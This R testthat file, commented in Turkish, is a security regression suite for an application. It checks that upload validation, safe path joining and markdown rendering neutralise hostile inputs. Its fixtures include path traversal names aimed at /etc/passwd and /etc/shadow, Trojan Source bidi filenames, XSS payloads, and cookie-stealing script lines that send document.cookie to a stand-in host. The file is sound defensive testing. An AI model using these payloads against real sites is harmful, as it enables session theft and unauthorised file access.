# ==============================================================================
# Dosya Yolu: tests/testthat/test-adversarial-hostile-input-behavior.R
# Açıklama: Faz 5 düşman/güvenlik regresyon kapsaması. Gerçekçi hostile
#           girdilere karşı mevcut savunma sınırlarını kilitler:
#           - kötü amaçlı dosya adları / path traversal / mutlak yol
#             (utils_upload_validator, utils_safe_path),
#           - Unicode bidi-override (Trojan Source) uzantı gizleme,
#           - kötü amaçlı markdown / ham HTML / script / olay işleyici /
#             tehlikeli protokol linkleri (helpers_markdown_safety),
#           - kötü amaçlı kayıtlı sohbet / üretilen görsel açıklaması XSS'i
#             (mergen_generated_image_card_html).
#           Tümü deterministik ve çevrimdışıdır; gerçek DB/LLM/browser yoktur.
# ==============================================================================

# --- İzole ortam yükleyicileri ---
.advUploadEnv <- function() {
  env <- new.env(parent = globalenv())
  source(file.path(resolve_repo_root_for_tests(), "R", "utils_upload_validator.R"),
         encoding = "UTF-8", local = env)
  env
}

.advSafePathEnv <- function() {
  env <- new.env(parent = globalenv())
  source(file.path(resolve_repo_root_for_tests(), "R", "utils_safe_path.R"),
         encoding = "UTF-8", local = env)
  env
}

.advMarkdownEnv <- function() {
  env <- new.env(parent = globalenv())
  source(file.path(resolve_repo_root_for_tests(), "R", "helpers_markdown_safety.R"),
         encoding = "UTF-8", local = env)
  env
}

# ==============================================================================
# 1) KÖTÜ AMAÇLI DOSYA ADLARI VE PATH TRAVERSAL
# ==============================================================================

testthat::test_that("upload doğrulayıcı path traversal ve mutlak yol adlarını reddeder", {
  env <- .advUploadEnv()

  dusman_adlar <- c(
    "../../etc/passwd",
    "..\\..\\Windows\\System32\\config",
    "/etc/shadow",
    "C:\\Windows\\notepad.exe",
    "alt/klasor/dosya.pdf",
    "ters\\slash.pdf",
    "rapor/../../gizli.pdf"
  )

  for (ad in dusman_adlar) {
    testthat::expect_true(
      env$.upload_has_traversal(ad),
      info = sprintf("traversal reddi bekleniyordu: %s", ad)
    )
  }

  # Meşru düz dosya adları (Türkçe dahil) traversal sayılmaz
  for (ad in c("rapor.pdf", "Türkçe_çalışma_özeti_İstanbul.pdf", "veri 2026.xlsx")) {
    testthat::expect_false(
      env$.upload_has_traversal(ad),
      info = sprintf("meşru ad reddedilmemeli: %s", ad)
    )
  }
})

testthat::test_that("upload doğrulayıcı ASCII denetim baytlı dosya adlarını reddeder", {
  env <- .advUploadEnv()

  # Sekme, yeni satır ve DEL (127) bayt düzeyinde denetim karakteridir
  kotu <- paste0("rapor", rawToChar(as.raw(9L)), ".pdf")
  kotu2 <- paste0("rapor", rawToChar(as.raw(127L)), ".pdf")
  testthat::expect_true(env$.upload_has_control_bytes(kotu))
  testthat::expect_true(env$.upload_has_control_bytes(kotu2))
  testthat::expect_true(env$.upload_has_traversal(kotu))

  # Türkçe çok baytlı karakterler denetim baytı DEĞİLDİR
  testthat::expect_false(env$.upload_has_control_bytes("çğıİöşü.pdf"))
})

testthat::test_that("upload doğrulayıcı Unicode bidi-override (Trojan Source) adlarını reddeder", {
  env <- .advUploadEnv()

  # "fatura<U+202E>cod.exe": ekranda "faturaexe.doc" gibi görünüp gerçek uzantıyı
  # gizleyen klasik sağdan-sola override saldırısı
  rtl_override <- intToUtf8(c(utf8ToInt("fatura"), 0x202E, utf8ToInt("cod.exe")))
  testthat::expect_true(env$.upload_has_bidi_control(rtl_override))
  testthat::expect_true(env$.upload_has_traversal(rtl_override))

  # Diğer bidi kontrol karakterleri de reddedilir
  for (cp in c(0x200E, 0x200F, 0x202A, 0x202D, 0x2066, 0x2069)) {
    ad <- intToUtf8(c(utf8ToInt("dosya"), cp, utf8ToInt(".pdf")))
    testthat::expect_true(
      env$.upload_has_bidi_control(ad),
      info = sprintf("bidi kod noktası reddedilmeli: U+%04X", cp)
    )
  }

  # Meşru Türkçe ad bidi içermez, kabul edilir
  testthat::expect_false(env$.upload_has_bidi_control("Türkçe_çalışma_İstanbul.pdf"))
  testthat::expect_false(env$.upload_has_bidi_control("rapor.pdf"))
  testthat::expect_false(env$.upload_has_bidi_control(""))
})

testthat::test_that("validate_uploaded_file bidi-override adını gerçek dosyada bad_filename ile reddeder", {
  env <- .advUploadEnv()

  tmp <- withr::local_tempdir()
  fiziksel <- file.path(tmp, "guvenli_fiziksel.pdf")
  writeBin(as.raw(c(0x25, 0x50, 0x44, 0x46)), fiziksel)  # "%PDF"

  rtl_override <- intToUtf8(c(utf8ToInt("fatura"), 0x202E, utf8ToInt("cod.exe")))
  sonuc <- env$validate_uploaded_file(
    path = fiziksel,
    filename = rtl_override,
    max_size_mb = 25L,
    allowed_ext = NULL
  )

  testthat::expect_false(sonuc$ok)
  testthat::expect_identical(sonuc$code, "bad_filename")

  # Aynı fiziksel dosya, meşru Türkçe görünen adla kabul edilir
  iyi <- env$validate_uploaded_file(
    path = fiziksel,
    filename = "Fatura_Özeti_2026.pdf",
    max_size_mb = 25L,
    allowed_ext = c("pdf")
  )
  testthat::expect_true(iyi$ok)
})

testthat::test_that("safe_join_path traversal/mutlak/nokta-segment kaçışlarını NULL ile reddeder", {
  env <- .advSafePathEnv()
  taban <- file.path(withr::local_tempdir(), "kullanici_deposu")

  # Hostile segmentler taban dışına çıkmaya çalışır -> hepsi NULL
  for (seg in c("../gizli", "..\\gizli", "/etc/passwd", "C:\\Windows\\x",
                "a/../../b", " . ", "alt/../../../kok")) {
    testthat::expect_null(
      env$safe_join_path(taban, seg),
      info = sprintf("kaçış reddedilmeli: %s", seg)
    )
  }

  # Meşru alt yol (Türkçe dahil) taban ALTINDA birleşir
  iyi <- env$safe_join_path(taban, "alt/Türkçe_dosya.pdf")
  testthat::expect_false(is.null(iyi))
  testthat::expect_true(startsWith(
    paste0(iyi, "/"),
    paste0(normalizePath(taban, winslash = "/", mustWork = FALSE), "/")
  ))
})

# ==============================================================================
# 2) KÖTÜ AMAÇLI MARKDOWN / HAM HTML / SCRIPT / OLAY İŞLEYİCİ
# ==============================================================================

testthat::test_that("render_safe_markdown_html script/iframe/style/event-handler etiketlerini etkisizleştirir", {
  env <- .advMarkdownEnv()

  dusman_payloadlar <- c(
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=\"http://kotu/\"></iframe>",
    "<style>body{display:none}</style>",
    "<body onload=alert(1)>",
    "<a href=\"#\" onclick=\"steal()\">x</a>"
  )

  for (payload in dusman_payloadlar) {
    out <- env$render_safe_markdown_html(payload)
    # Hiçbir AKTİF tehlikeli etiket oluşmamalı (açı parantezleri kaçırılır)
    testthat::expect_false(grepl("<script", out, ignore.case = TRUE),
                           info = sprintf("aktif <script: %s", payload))
    testthat::expect_false(grepl("<iframe", out, ignore.case = TRUE),
                           info = sprintf("aktif <iframe: %s", payload))
    testthat::expect_false(grepl("<style", out, ignore.case = TRUE),
                           info = sprintf("aktif <style: %s", payload))
    # Gerçek bir HTML etiketi üzerinde olay işleyici attribute'u oluşmamalı
    testthat::expect_false(grepl("<[^>]+\\son[a-z]+\\s*=", out, perl = TRUE, ignore.case = TRUE),
                           info = sprintf("aktif olay işleyici: %s", payload))
  }
})

testthat::test_that("render_safe_markdown_html tehlikeli link protokollerini etkisizleştirir, güvenli olanları korur", {
  env <- .advMarkdownEnv()

  # javascript:, vbscript: ve data:text/html (büyük/küçük harf farkı dahil) nötr
  tehlikeli_linkler <- c(
    "[x](javascript:alert(1))",
    "[x](JaVaScRiPt:alert(1))",
    "[x](vbscript:msgbox(1))",
    "[x](VBScript:msgbox(1))",
    "[x](data:text/html,<script>alert(1)</script>)",
    "[x](data:text/html;base64,PHNjcmlwdD4=)"
  )
  for (md in tehlikeli_linkler) {
    out <- env$render_safe_markdown_html(md)
    testthat::expect_false(grepl("javascript:", out, ignore.case = TRUE),
                           info = sprintf("javascript: kaldı: %s", md))
    testthat::expect_false(grepl("vbscript:", out, ignore.case = TRUE),
                           info = sprintf("vbscript: kaldı: %s", md))
    testthat::expect_false(grepl("data:text/html", out, ignore.case = TRUE),
                           info = sprintf("data:text/html kaldı: %s", md))
    testthat::expect_true(grepl("data-mergen-unsafe-href=\"removed\"", out, fixed = TRUE),
                          info = sprintf("nötr işaret yok: %s", md))
  }

  # Güvenli linkler ve güvenli data:image korunur (yanlış pozitif olmamalı)
  guvenli_https <- env$render_safe_markdown_html("[rapor](https://intranet.kurum/rapor)")
  testthat::expect_true(grepl("href=\"https://intranet.kurum/rapor\"", guvenli_https, fixed = TRUE))

  guvenli_img <- env$render_safe_markdown_html("[logo](data:image/png;base64,iVBORw0KGgo=)")
  testthat::expect_true(grepl("data:image/png;base64", guvenli_img, fixed = TRUE))
  testthat::expect_false(grepl("data-mergen-unsafe-href", guvenli_img, fixed = TRUE))
})

testthat::test_that("render_safe_markdown_html bölünmüş/parçalı tehlikeli etiketleri aktif hale getirmez", {
  env <- .advMarkdownEnv()

  # Streaming sırasında parçalanmış görünebilen kötü payload'lar yine inert kalır:
  # tüm '<' ve '>' kaçırıldığı için hiçbir aktif etiket oluşmaz
  parcali <- c(
    "<scri",
    "pt>alert(1)</scr",
    "<img sr",
    "c=x oner",
    "ror=alert(1)>",
    "<<script>>alert(1)<</script>>"
  )
  for (p in parcali) {
    out <- env$render_safe_markdown_html(p)
    testthat::expect_false(grepl("<script", out, ignore.case = TRUE))
    testthat::expect_false(grepl("<img", out, ignore.case = TRUE))
  }
})

testthat::test_that("kötü amaçlı kayıtlı sohbet metni güvenli markdown sınırından geçer", {
  env <- .advMarkdownEnv()

  # DB'den yeniden yüklenen (kullanıcı/LLM kontrollü) sohbet içeriği gibi davranan
  # karışık tehlikeli payload + meşru Türkçe metin
  kotu_kayitli_sohbet <- paste(
    "# Rapor <script>fetch('//kotu/'+document.cookie)</script>",
    "Normal **Türkçe** metin: çğıİöşü.",
    "[indir](javascript:steal())",
    "<img src=x onerror=\"new Image().src='//kotu/'+document.cookie\">",
    sep = "\n"
  )

  out <- env$render_safe_markdown_html(kotu_kayitli_sohbet)

  testthat::expect_false(grepl("<script", out, ignore.case = TRUE))
  testthat::expect_false(grepl("<[^>]+\\sonerror\\s*=", out, perl = TRUE, ignore.case = TRUE))
  testthat::expect_false(grepl("javascript:", out, ignore.case = TRUE))
  # Meşru Türkçe içerik korunur ve doğru render edilir
  testthat::expect_true(grepl("çğıİöşü", out, fixed = TRUE))
  testthat::expect_true(grepl("<strong>Türkçe</strong>", out, fixed = TRUE))
})

# ==============================================================================
# 3) ÜRETİLEN GÖRSEL AÇIKLAMASI / MESAJ ID XSS SINIRI
# ==============================================================================

testthat::test_that("mergen_generated_image_card_html kötü açıklama ve message_id'yi kaçışlar", {
  env <- .advMarkdownEnv()

  html <- env$mergen_generated_image_card_html(
    message_id = "m\"><script>alert(1)</script>",
    img_src = "session/data/abc",
    description = "<img src=x onerror=alert(1)> kötü açıklama"
  )

  # message_id ve description HTML kaçışına tabidir; aktif script/handler oluşmaz
  testthat::expect_false(grepl("<script>alert(1)</script>", html, fixed = TRUE))
  testthat::expect_false(grepl("onerror=alert(1)>", html, fixed = TRUE))
  testthat::expect_true(grepl("&lt;script&gt;", html, fixed = TRUE))

  # Kart iskeleti (filigran + butonlar) yine de üretilir
  testthat::expect_true(grepl("MERGEN Bilge", html, fixed = TRUE))
  testthat::expect_true(grepl("generated-image-container", html, fixed = TRUE))

  # img_src çağıran tarafça güvenli kabul edilir ve olduğu gibi yerleştirilir
  testthat::expect_true(grepl("src=\"session/data/abc\"", html, fixed = TRUE))

  # Boş/NULL açıklama bölümü hiç eklenmez
  html_bos <- env$mergen_generated_image_card_html("m", "u", description = NULL)
  testthat::expect_false(grepl("image-description", html_bos, fixed = TRUE))
})
